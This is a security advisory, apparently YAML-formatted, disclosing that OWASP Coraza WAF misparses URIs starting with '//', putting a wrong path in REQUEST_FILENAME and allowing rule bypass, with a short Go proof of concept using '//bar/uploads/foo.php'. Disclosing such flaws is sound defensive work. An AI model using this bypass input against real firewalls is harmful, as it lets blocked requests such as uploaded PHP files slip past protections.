summary: "OWASP Coraza WAF has parser confusion which leads to wrong URI in `REQUEST_FILENAME`\n\
  ### Summary\n\nURLs starting with `//` are not parsed properly, and the request `REQUEST_FILENAME`\
  \ variable contains a wrong value, leading to potential rules bypass.\n\n### Details\n\nIf\
  \ a request is made on an URI starting with `//`, coraza will set a wrong value in `REQUEST_FILENAME`.\n\
  For example, if the URI `//bar/uploads/foo.php?a=b` is passed to coraza: , `REQUEST_FILENAME`\
  \ will be set to `/uploads/foo.php`.\n\nThe root cause is the usage of `url.Parse` to parse\
  \ the URI in [ProcessURI](https://github.com/corazawaf/coraza/blob/8b612f4e6e18c606e371110227bc7669dc714cab/internal/corazawaf/transaction.go#L768).\n\
  \n`url.Parse` can parse both absolute URLs (starting with a scheme) or relative ones (just\
  \ the path). \n`//bar/uploads/foo.php` is a valid absolute URI (the scheme is empty), `url.Parse`\
  \ will consider `bar` as the host and the path will be set to `/uploads/foo.php`.\n\n### PoC\n\
  \n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"net/url\"\n\t\"os\"\n\n\t\"github.com/corazawaf/coraza/v3\"\
  \n)\n\nconst testRule = `\nSecDebugLogLevel 9\nSecDebugLog /dev/stdout\nSecRule REQUEST_FILENAME\
  \ \"@rx /bar/uploads/.*\\.(h?ph(p|tm?l?|ar)|module|shtml)\" \"id:1,phase:1,deny\"\n`\n\nfunc\
  \ main() {\n\tvar testURL = \"//bar/uploads/foo.php\"\n\n\tif os.Getenv(\"TEST_URL\") != \"\
  \" {\n\t\ttestURL = os.Getenv(\"TEST_URL\")\n\t}\n\n\tfmt.Printf(\"Testing URL: %s\\n\", testURL)\n\
  \n\tconfig := coraza.NewWAFConfig().WithDirectives(testRule)\n\n\twaf, err := coraza.NewWAF(config)\n\
  \n\tif err != nil {\n\t\tpanic(err)\n\t}\n\n\ttx := waf.NewTransaction()\n\n\ttx.ProcessURI(testURL,\
  \ \"GET\", \"HTTP/1.1\")\n\n\tin := tx.ProcessRequestHeaders()\n\n\tif in != nil {\n\t\tfmt.Printf(\"\
  %+v\\n\", in)\n\t}\n}\n```\n\n### Impact\n\nPotential bypass of rules using `REQUEST_FILENAME`."
